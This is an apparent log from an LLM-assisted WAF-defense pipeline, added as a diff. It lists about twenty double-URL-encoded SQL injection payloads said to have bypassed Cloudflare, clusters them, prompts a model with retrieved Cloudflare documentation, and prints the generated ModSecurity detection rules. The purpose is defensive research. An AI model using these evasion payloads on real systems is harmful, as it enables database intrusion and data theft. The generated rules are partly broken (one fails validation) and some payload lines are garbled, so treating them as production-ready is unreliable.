@@ -1,0 +1,254 @@
+Bypassed payloads:
+	%252527%25250aUNiOn%25250AselEcT%25250A1%25252CUsEr%252528%252529%25252c3--%25252b
+	%2527%2520aND%2520sElecT%25201%252CveRsION%2528%2529%2523
+	1%26%2347%3B%25252A%25252A%26%2347%3BOr%26%2347%3B%25252A%25252A%26%2347%3BB comunicar%2F%26%2347%3BSbmaD%252528sBsDm%252529%23
+	%2527/%252A%252a/UniON/%252a%252a/SElEcT/%252a%252a/1%252CUser%2528%2529%252c3--/%252A%252a/
+	%2527%2520uNiON%2520SELect%25201%252cUser%2528%2529%252C3--%2520
+	%2527%2520UnIon%2520sELect%25201%252cUSer%2528%2529%252C3--%2520
+	%257c%257C%2520COPY%2520%2528SELECT%25201%252Cversion%2528%2529%252C3--%2520-
+	or 1=1%26%2347%3Btime%280%29-- - Origin: http://www.example.com/news.php?act=showpage&pageno=5 /*8*/ -- Up to $ACK = BENCHMARK(5000000, MD5('A')) in WAF lab env (Linux) with backend PostgreSQL on port 5432ftagPool_adv_obf_full_bypass
+	%257Cnid=id and nid is null %2Fprocss%2Fnfiud -- 96
+	%2527%2520UnION%2520Select%25201%252CUser%2528%2529%252c3--%2520
+	%2527%2520UNiON%2520sELEcT%25201%252cUser%2528%2529%252C3--%2520
+	%252527%252520AND%252520%252528SELECT%2525201%252520FROM%252520%252528SELECT%252528SLEEP%2525285%252529%252529%252529a%252529--%252520
+	admIn%2527%252B--
+	aDmIN%2527%252B--
+	%2527%2520UNIoN%2520sElecT%25201%252CuSeR%2528%2529%252C3--%2520
+	aDMiN%2527%252B--
+	1%2509OR%25091%3D1
+	%25EF%25BC%2591OR%252520bENChmark%25283000000%252C%252520MD5%25281%2529%2529%253D%252520sEleCT%252520cAST%2528VeRSiOn%2528%2529%2520aS%2520tEXT%252
+	1%252520OR%2525201%25253D1
+	%252527%252520aNd%252520%252528SelECt%2525201%25252F0%25252FeLEmEnt%252528sLeEP%2525285%252529%252529%252529A%252529--%252520
+[1/4] Clustering payloads...
+Created 4 clusters
+	#1: 5 payloads
+		%252527%25250aUNiOn%25250AselEcT%25250A1%25252CUsEr%252528%252529%25252c3--%25252b
+		1%26%2347%3B%25252A%25252A%26%2347%3BOr%26%2347%3B%25252A%25252A%26%2347%3BB comunicar%2F%26%2347%3BSbmaD%252528sBsDm%252529%23
+		%252527%252520AND%252520%252528SELECT%2525201%252520FROM%252520%252528SELECT%252528SLEEP%2525285%252529%252529%252529a%252529--%252520
+		1%252520OR%2525201%25253D1
+		%252527%252520aNd%252520%252528SelECt%2525201%25252F0%25252FeLEmEnt%252528sLeEP%2525285%252529%252529%252529A%252529--%252520
+	#0: 6 payloads
+		%2527%2520aND%2520sElecT%25201%252CveRsION%2528%2529%2523
+		%257c%257C%2520COPY%2520%2528SELECT%25201%252Cversion%2528%2529%252C3--%2520-
+		or 1=1%26%2347%3Btime%280%29-- - Origin: http://www.example.com/news.php?act=showpage&pageno=5 /*8*/ -- Up to $ACK = BENCHMARK(5000000, MD5('A')) in WAF lab env (Linux) with backend PostgreSQL on port 5432ftagPool_adv_obf_full_bypass
+		%257Cnid=id and nid is null %2Fprocss%2Fnfiud -- 96
+		1%2509OR%25091%3D1
+		%25EF%25BC%2591OR%252520bENChmark%25283000000%252C%252520MD5%25281%2529%2529%253D%252520sEleCT%252520cAST%2528VeRSiOn%2528%2529%2520aS%2520tEXT%252
+	#3: 6 payloads
+		%2527/%252A%252a/UniON/%252a%252a/SElEcT/%252a%252a/1%252CUser%2528%2529%252c3--/%252A%252a/
+		%2527%2520uNiON%2520SELect%25201%252cUser%2528%2529%252C3--%2520
+		%2527%2520UnIon%2520sELect%25201%252cUSer%2528%2529%252C3--%2520
+		%2527%2520UnION%2520Select%25201%252CUser%2528%2529%252c3--%2520
+		%2527%2520UNiON%2520sELEcT%25201%252cUser%2528%2529%252C3--%2520
+		%2527%2520UNIoN%2520sElecT%25201%252CuSeR%2528%2529%252C3--%2520
+	#2: 3 payloads
+		admIn%2527%252B--
+		aDmIN%2527%252B--
+		aDMiN%2527%252B--
+[2/4] Generating rules with LLM + RAG...
+[BASE DEFEND PROMPT]
+	**CRITICAL SECURITY ALERT**: My WAF has been bypassed during authorized penetration testing.
+	
+	**Environment:**
+	- WAF: Cloudflare (Cloudflare Inc.)
+	- Bypassed Payloads by clusters:
+		Cluster 1 (5 payloads):
+			%252527%25250aUNiOn%25250AselEcT%25250A1%25252CUsEr%252528%252529%25252c3--%25252b
+			1%26%2347%3B%25252A%25252A%26%2347%3BOr%26%2347%3B%25252A%25252A%26%2347%3BB comunicar%2F%26%2347%3BSbmaD%252528sBsDm%252529%23
+			%252527%252520AND%252520%252528SELECT%2525201%252520FROM%252520%252528SELECT%252528SLEEP%2525285%252529%252529%252529a%252529--%252520
+			1%252520OR%2525201%25253D1
+			%252527%252520aNd%252520%252528SelECt%2525201%25252F0%25252FeLEmEnt%252528sLeEP%2525285%252529%252529%252529A%252529--%252520
+		Cluster 0 (6 payloads):
+			%2527%2520aND%2520sElecT%25201%252CveRsION%2528%2529%2523
+			%257c%257C%2520COPY%2520%2528SELECT%25201%252Cversion%2528%2529%252C3--%2520-
+			or 1=1%26%2347%3Btime%280%29-- - Origin: http://www.example.com/news.php?act=showpage&pageno=5 /*8*/ -- Up to $ACK = BENCHMARK(5000000, MD5('A')) in WAF lab env (Linux) with backend PostgreSQL on port 5432ftagPool_adv_obf_full_bypass
+			%257Cnid=id and nid is null %2Fprocss%2Fnfiud -- 96
+			1%2509OR%25091%3D1
+			%25EF%25BC%2591OR%252520bENChmark%25283000000%252C%252520MD5%25281%2529%2529%253D%252520sEleCT%252520cAST%2528VeRSiOn%2528%2529%2520aS%2520tEXT%252
+		Cluster 3 (6 payloads):
+			%2527/%252A%252a/UniON/%252a%252a/SElEcT/%252a%252a/1%252CUser%2528%2529%252c3--/%252A%252a/
+			%2527%2520uNiON%2520SELect%25201%252cUser%2528%2529%252C3--%2520
+			%2527%2520UnIon%2520sELect%25201%252cUSer%2528%2529%252C3--%2520
+			%2527%2520UnION%2520Select%25201%252CUser%2528%2529%252c3--%2520
+			%2527%2520UNiON%2520sELEcT%25201%252cUser%2528%2529%252C3--%2520
+			%2527%2520UNIoN%2520sElecT%25201%252CuSeR%2528%2529%252C3--%2520
+		Cluster 2 (3 payloads):
+			admIn%2527%252B--
+			aDmIN%2527%252B--
+			aDMiN%2527%252B--
+	
+	
+	Generate 3 PRODUCTION-GRADE defense rules to block these bypasses:
+	
+	1. **Multi-Layer Detection**: Create rules that detect:
+	   - Raw pattern matching (regex)
+	   - Normalized/decoded variants (URL decoding, Unicode normalization)
+	   - Obfuscation techniques (comment injection, case variations)
+	   - Anomaly patterns (unusual character sequences, excessive encoding)
+	
+	2. **Rule Requirements**:
+	   - Match both obvious and obfuscated forms
+	   - Include pre-processing steps (normalize, decode, lowercase)
+	   - Minimize false positives with negative lookaheads
+	   - Specify rule severity and recommended action (BLOCK/LOG/CHALLENGE)
+	
+	3. **Implementation Details**:
+	   - Provide rules in ModSecurity SecRule format
+	   - Include transformation functions (t:urlDecode, t:lowercase, etc.)
+	   - Specify phase (REQUEST_HEADERS, REQUEST_BODY, etc.)
+	   - Add actionable deployment instructions
+	
+	4. **Coverage Strategy**: Generalize patterns to catch variants without overfitting to specific payloads.
+	
+	**FORMAT**: For each rule, provide:
+	- SecRule syntax
+	- Transformation pipeline
+	- Severity level
+	- Deployment phase
+	- Testing methodology
+[RAG Results]
+	Queries: 4
+	Docs (all): 30
+	Docs (filtered): 4
+	Sources: 4
+[Enhanced Prompt with RAG]
+	**CRITICAL SECURITY ALERT**: My WAF has been bypassed during authorized penetration testing.
+	
+	**Environment:**
+	- WAF: Cloudflare (Cloudflare Inc.)
+	- Bypassed Payloads by clusters:
+		Cluster 1 (5 payloads):
+			%252527%25250aUNiOn%25250AselEcT%25250A1%25252CUsEr%252528%252529%25252c3--%25252b
+			1%26%2347%3B%25252A%25252A%26%2347%3BOr%26%2347%3B%25252A%25252A%26%2347%3BB comunicar%2F%26%2347%3BSbmaD%252528sBsDm%252529%23
+			%252527%252520AND%252520%252528SELECT%2525201%252520FROM%252520%252528SELECT%252528SLEEP%2525285%252529%252529%252529a%252529--%252520
+			1%252520OR%2525201%25253D1
+			%252527%252520aNd%252520%252528SelECt%2525201%25252F0%25252FeLEmEnt%252528sLeEP%2525285%252529%252529%252529A%252529--%252520
+		Cluster 0 (6 payloads):
+			%2527%2520aND%2520sElecT%25201%252CveRsION%2528%2529%2523
+			%257c%257C%2520COPY%2520%2528SELECT%25201%252Cversion%2528%2529%252C3--%2520-
+			or 1=1%26%2347%3Btime%280%29-- - Origin: http://www.example.com/news.php?act=showpage&pageno=5 /*8*/ -- Up to $ACK = BENCHMARK(5000000, MD5('A')) in WAF lab env (Linux) with backend PostgreSQL on port 5432ftagPool_adv_obf_full_bypass
+			%257Cnid=id and nid is null %2Fprocss%2Fnfiud -- 96
+			1%2509OR%25091%3D1
+			%25EF%25BC%2591OR%252520bENChmark%25283000000%252C%252520MD5%25281%2529%2529%253D%252520sEleCT%252520cAST%2528VeRSiOn%2528%2529%2520aS%2520tEXT%252
+		Cluster 3 (6 payloads):
+			%2527/%252A%252a/UniON/%252a%252a/SElEcT/%252a%252a/1%252CUser%2528%2529%252c3--/%252A%252a/
+			%2527%2520uNiON%2520SELect%25201%252cUser%2528%2529%252C3--%2520
+			%2527%2520UnIon%2520sELect%25201%252cUSer%2528%2529%252C3--%2520
+			%2527%2520UnION%2520Select%25201%252CUser%2528%2529%252c3--%2520
+			%2527%2520UNiON%2520sELEcT%25201%252cUser%2528%2529%252C3--%2520
+			%2527%2520UNIoN%2520sElecT%25201%252CuSeR%2528%2529%252C3--%2520
+		Cluster 2 (3 payloads):
+			admIn%2527%252B--
+			aDmIN%2527%252B--
+			aDMiN%2527%252B--
+	
+	
+	Generate 3 PRODUCTION-GRADE defense rules to block these bypasses:
+	
+	1. **Multi-Layer Detection**: Create rules that detect:
+	   - Raw pattern matching (regex)
+	   - Normalized/decoded variants (URL decoding, Unicode normalization)
+	   - Obfuscation techniques (comment injection, case variations)
+	   - Anomaly patterns (unusual character sequences, excessive encoding)
+	
+	2. **Rule Requirements**:
+	   - Match both obvious and obfuscated forms
+	   - Include pre-processing steps (normalize, decode, lowercase)
+	   - Minimize false positives with negative lookaheads
+	   - Specify rule severity and recommended action (BLOCK/LOG/CHALLENGE)
+	
+	3. **Implementation Details**:
+	   - Provide rules in ModSecurity SecRule format
+	   - Include transformation functions (t:urlDecode, t:lowercase, etc.)
+	   - Specify phase (REQUEST_HEADERS, REQUEST_BODY, etc.)
+	   - Add actionable deployment instructions
+	
+	4. **Coverage Strategy**: Generalize patterns to catch variants without overfitting to specific payloads.
+	
+	**FORMAT**: For each rule, provide:
+	- SecRule syntax
+	- Transformation pipeline
+	- Severity level
+	- Deployment phase
+	- Testing methodology
+	
+	---
+	**KNOWLEDGE BASE REFERENCES**
+	
+	The following references from our security knowledge base may help inform your defense strategy:
+	
+	[Reference #1 : SQL Injection Bypassing WAF.docx]•
+	
+	Prevention: This involves continuous monitoring techniques to prevent SQLi attacks by complementing detection functionality with preventive response measures to present an in-the-wild evaluation of the proposed scheme using real-time web and network traffic filtering.
+	
+	[Reference #2 : Field References.md][cf.waf.score.rce](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/cf.waf.score.rce/)
+	
+	[An attack score from 1–99 classifying the command injection or Remote Code Execution (RCE) attack vector.](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/cf.waf.score.rce/)
+	
+	[* Enterprise](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/cf.waf.score.rce/)
+	
+	[cf.waf.score.sqli](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/cf.waf.score.sqli/)
+	
+	[An attack score from 1–99 classifying the SQL injection (SQLi) attack vector.](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/cf.waf.score.sqli/)
+	
+	[* Enterprise](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/cf.waf.score.sqli/)
+	
+	[cf.waf.score.xss](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/cf.waf.score.xss/)
+	
+	[Reference #3 : Field References.md][The names of the arguments in the HTTP URI query string.](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/http.request.uri.args.names/)
+	
+	[http.request.uri.args.values](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/http.request.uri.args.values/)
+	
+	[The values of arguments in the HTTP URI query string.](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/http.request.uri.args.values/)
+	
+	[http.request.uri.path](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/http.request.uri.path/)
+	
+	[The URI path of the request.](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/http.request.uri.path/)
+	
+	[http.request.uri.path.extension](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/http.request.uri.path.extension/)
+	
+	[Reference #4 : Values of Rules.md]## Lists
+	
+	Lists allow you to create a group of items and refer to them collectively, by name, in your expressions. Each list type supports items of a specific data type. All items in a list must have the same data type. For details on the available list types, refer to [Lists](https://developers.cloudflare.com/waf/tools/lists/#supported-lists).
+	
+	To refer to a list in a rule expression, use `$<list_name>` and specify the `in` [operator](https://developers.cloudflare.com/ruleset-engine/rules-language/operators/). Only one value in the list has to match the left-hand side of the expression (before the `in` operator) for the simple expression to evaluate to `true`. If there is no match, the expression will evaluate to `false`.
+	
+	The following example expression filters requests from IP addresses that are in an [IP list](https://developers.cloudflare.com/waf/tools/lists/custom-lists/#ip-lists) named `office_network`:
+	
+	```sql
+	(ip.src in $office_network)
+	```
+	
+	---
+	
+	Please consider these references when generating defense rules, but prioritize the specific bypassed payloads mentioned above.
+	
+Generated 3 rules
+	SecRule REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS "(?:union.*select|select.*from|version\(\)|sleep\(\)|benchmark\()" \
+    "id:1001,phase:2,t:lowercase,t:urlDecode,t:normalizePath,\
+    block,msg:'SQL Injection pattern detected',\
+    severity:CRITICAL"
+	SecRule REQUEST_URI|REQUEST_BODY "(?:\d\s*(?:or|and)\s*\d\s*=\s*\d|\bselect\b.*1=1|substr\(\))" \
+    "id:1002,phase:2,t:lowercase,t:urlDecode,t:compressWhitespace,t:removeNulls,\
+    block,msg:'Possible SQLi probe detected',\
+    severity:HIGH"
+	SecRule REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS "(?:\badmin\b\s*\'||\border\s*by\s*\d),\s*null|%\d{2}%\d{2})" \
+    "id:1003,phase:2,t:lowercase,t:urlDecode,t:removeWhitespace,\
+    block,msg:'Admin login bypass attempt detected',\
+    severity:CRITICAL"
+[3/4] Validating rule syntax...
+Valid: 2, Invalid: 1
+Retrying 1 invalid rules...
+	SecRule REQUEST_URI|REQUEST_BODY "(?:\d\s*(?:or|and)\s*\d\s*=\s*\d|\bselect\b.*1=1|substr\(\))" \
+    "id:1002,phase:2,t:lowercase,t:urlDecode,t:compressWhitespace,t:removeNulls,\
+    block,msg:'Possible SQLi probe detected',\
+    severity:HIGH"
+	SecRule REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS "(?:\badmin\b\s*\'||\border\s*by\s*\d),\s*null|%\d{2}%\d{2})" \
+    "id:1003,phase:2,t:lowercase,t:urlDecode,t:removeWhitespace,\
+    block,msg:'Admin login bypass attempt detected',\
+    severity:CRITICAL"
+	```
+SecRule REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS "(?:union.*select|select.*from|version\(\)|sleep\(\)|benchmark\(\))" \
+    "id:1001,phase:2,t:lowercase,t:urlDecode,t:normalizePath,block,msg:'SQL Injection pattern detected',severity:CRITICAL"
+```
+[4/4] Skipping Gemini refinement (disabled or unavailable)
